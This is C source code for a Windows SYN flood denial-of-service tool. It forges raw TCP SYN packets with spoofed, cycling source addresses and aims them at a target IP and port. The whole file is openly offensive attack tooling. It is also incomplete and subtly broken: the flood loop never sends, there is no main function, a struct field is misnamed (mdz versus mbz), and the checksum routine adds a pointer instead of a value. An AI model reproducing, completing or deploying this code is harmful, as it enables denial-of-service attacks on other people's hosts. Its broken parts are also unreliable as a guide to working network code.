#pragma comment(lib, "ws2_32")
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#define SEQ 0x28376839

int threadnum, maxthread, port;

char * DestIP;

typedef struct tcphdr{
    USHORT th_sport;
    USHORT th_dport;
    unsigned int th_seq;
    unsigned int th_ack;
    unsigned char th_lenres;
    unsigned char th_flag;
    USHORT th_win;
    USHORT th_sum;
    USHORT th_urp;
} TCP_HEADER;

typedef struct iphdr {
    unsigned char h_verlen;
    unsigned char tos;
    unsigned short total_len;
    unsigned short ident;
    unsigned short frag_and_flags;
    unsigned char ttl;
    unsigned char proto;
    unsigned short checksum;
    unsigned int sourceIP;
    unsigned int destIP;
} IP_HEADER;

struct {
    unsigned long saddr;
    unsigned long daddr;
    char mbz;
    char ptcl;
    unsigned short tcpl;
} PSD_HEADER;

USHORT checksum(USHORT *buffer, int size){
    unsigned long cksum = 0;
    while (size > 1){
        cksum += *buffer++;
        size -= sizeof(USHORT);
    }
    
    if(size) cksum += (UCHAR*)buffer;
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return (USHORT) (~cksum);
}

DWORD WINAPI SynfloodThread(LPVOID lp){
    SOCKET sock = NULL;
    int ErrorCode=0, flag=true, TimeOut=2000, FakeIpNet, FakeIpHost, dataSize=0, SendSEQ = 0;
    struct sockaddr_in sockAddr;
    TCP_HEADER tcpheader;
    IP_HEADER ipheader;
    char sendBuf[128];
    sock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, 0, WSA_FLAG_OVERLAPPED);
    ErrorCode = setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&flag, sizeof(int));
    ErrorCode = setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&TimeOut, sizeof(TimeOut));
    memset(&sockAddr, 0, sizeof(sockAddr));
    sockAddr.sin_family = AF_INET;
    sockAddr.sin_addr.s_addr = inet_addr(DestIP);
    FakeIpNet = inet_addr(DestIP);
    FakeIpHost = ntohl(FakeIpNet);

    ipheader.h_verlen = (4<<4|sizeof(IP_HEADER)/sizeof(unsigned long));
    ipheader.total_len = htons(sizeof(IP_HEADER)+sizeof(TCP_HEADER));
    ipheader.ident = 1;
    ipheader.frag_and_flags = 0;
    ipheader.ttl = 128;
    ipheader.proto = IPPROTO_TCP;
    ipheader.checksum = 0;
    ipheader.sourceIP = htonl(FakeIpHost + SendSEQ);
    ipheader.destIP = inet_addr(DestIP);

    tcpheader.th_dport = htons(port);
    tcpheader.th_sport = htons(8080);
    tcpheader.th_seq = htonl(SEQ + SendSEQ);
    tcpheader.th_ack = 0;
    tcpheader.th_lenres = (sizeof(TCP_HEADER)/4<<4|0);
    tcpheader.th_flag = 2;
    tcpheader.th_win = htons(16384);
    tcpheader.th_urp = 0;
    tcpheader.th_sum = 0;

    PSD_HEADER.saddr = ipheader.sourceIP;
    PSD_HEADER.daddr = ipheader.destIP;
    PSD_HEADER.mdz = 0;
    PSD_HEADER.ptcl = IPPROTO_TCP;
    PSD_HEADER.tcpl = htons(sizeof(tcpheader));

    for(;;){
        SendSEQ = (SendSEQ == 65535)?1:SendSEQ+1;
        ipheader.checksum = 0;
        ipheader.sourceIP = htonl(FakeIpHost + SendSEQ);
        tcpheader.th_seq = htonl(SEQ+SendSEQ);
        tcpheader.th_sport = htons(SendSEQ);
        tcpheader.th_sum = 0;
        PSD_HEADER.saddr = ipheader.sourceIP;
    }
}

void display(void){
    static int play = 0;
    char *plays[12] = {
        "|", "/", "-", "\\",
        "|", "/", "-", "\\",
        "|", "/", "-", "\\",
    };
    printf("=%s= %d threads \r", plays[play], threadnum);
    play = (play == 11) ? 0 : play + 1;
}


